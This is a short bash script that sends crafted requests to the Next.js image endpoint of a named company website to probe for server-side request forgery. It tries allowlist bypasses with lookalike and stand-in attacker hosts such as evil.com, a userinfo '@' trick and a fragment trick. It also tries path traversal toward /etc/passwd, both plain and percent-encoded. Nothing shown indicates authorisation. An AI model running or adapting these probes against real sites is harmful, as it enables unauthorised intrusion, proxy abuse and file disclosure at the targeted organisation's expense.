#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
B='https://www.infinitycapital.bh/_next/image'
t(){ echo "== $1"; curl -sk -A "$UA" -o /tmp/i.bin -w "  code=%{http_code} size=%{size_download} ct=%{content_type}\n" "$B?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1")&w=640&q=75"; }
t 'https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg'
t 'https://images.ctfassets.net.evil.example.com/a.jpg'
t 'https://evil.com/a.jpg'
t 'https://images.ctfassets.net@evil.com/a.jpg'
t 'https://evil.com/#images.ctfassets.net'
t 'https://ctfassets.net/a.jpg'
t 'https://sub.images.ctfassets.net/a.jpg'
t 'http://images.ctfassets.net/a.jpg'
t 'https://images.ctfassets.net/../../../../etc/passwd'
t 'https://images.ctfassets.net/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
